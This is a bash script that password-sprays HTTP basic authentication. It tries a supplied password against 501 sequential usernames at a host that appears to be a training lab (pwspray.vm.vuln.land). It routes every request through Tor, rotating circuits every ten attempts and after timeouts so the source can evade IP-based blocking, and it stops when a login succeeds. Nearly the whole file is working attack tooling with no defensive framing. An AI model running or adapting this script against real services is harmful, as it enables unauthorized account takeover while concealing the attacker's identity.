#!/usr/bin/bash

password=$1 # the password is supplied as command line parameter
user_prefix="user_140" # all usernames start with this prefix
url="http://pwspray.vm.vuln.land/" # HTTP endpoint

MAX_RETRIES=2        # change this if you want more/less retries on timeout
COOLDOWN=5           # seconds to sleep after Tor restart/rotate

rotate_tor() {
  # Try to ask Tor for a new circuit; if control port isn't available, restart service
  (printf 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n' | nc -w 2 127.0.0.1 9051 >/dev/null 2>&1) || \
  (sudo systemctl restart tor >/dev/null 2>&1 || sudo service tor restart >/dev/null 2>&1 || true)
  sleep "$COOLDOWN"
}

user=0
while ((user <= 500)); do # iterate through all 501 possible usernames
    if !((user % 10)); then # at the beginning and after 10 users, restart tor
        echo "Restarting Tor service and sleeping for ${COOLDOWN} seconds"
        rotate_tor
    fi

    user_expanded=$(printf "%03d" "$user") # add leading 0s to user (e.g., 25 => 025)
    candidate="$user_prefix$user_expanded:$password" # create the next username-password candidate
    echo -n "Testing $candidate -> "

    out=$(curl -4 -s -o /dev/null --http1.1 --socks5-hostname 127.0.0.1:9050 \
            --connect-timeout 5 --max-time 10 \
            -w '%{http_code}|%{remote_ip}:%{remote_port}|%{time_total}|%{errormsg}' \
            -u "$candidate" "$url" || true)
    IFS='|' read -r code remote t_total err <<< "$out"
    echo "code=$code time=${t_total:-0}s via=${remote:-127.0.0.1:9050}${err:+ err=\"$err\"}"

    # simple retry loop on timeout (curl reports 000)
    if [[ "$code" == "000" ]]; then
        for ((r=1; r<=MAX_RETRIES; r++)); do
            echo "  retry #$r for $candidate"
            out=$(curl -4 -s -o /dev/null --http1.1 --socks5-hostname 127.0.0.1:9050 \
                    --connect-timeout 5 --max-time 10 \
                    -w '%{http_code}|%{remote_ip}:%{remote_port}|%{time_total}|%{errormsg}' \
                    -u "$candidate" "$url" || true)
            IFS='|' read -r code remote t_total err <<< "$out"
            echo "  result: code=$code time=${t_total:-0}s via=${remote:-127.0.0.1:9050}${err:+ err=\"$err\"}"
            [[ "$code" != "000" ]] && break
        done

        # still no luck? rotate node once, then try once more
        if [[ "$code" == "000" ]]; then
            echo "  timeout persists -> rotating Tor and trying once more"
            rotate_tor
            out=$(curl -4 -s -o /dev/null --http1.1 --socks5-hostname 127.0.0.1:9050 \
                    --connect-timeout 5 --max-time 10 \
                    -w '%{http_code}|%{remote_ip}:%{remote_port}|%{time_total}|%{errormsg}' \
                    -u "$candidate" "$url" || true)
            IFS='|' read -r code remote t_total err <<< "$out"
            echo "  post-rotate: code=$code time=${t_total:-0}s via=${remote:-127.0.0.1:9050}${err:+ err=\"$err\"}"
        fi
    fi

    # success -> stop
    if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" ]]; then
        echo "SUCCESS: $candidate"
        exit 0
    fi

    ((user++))
done
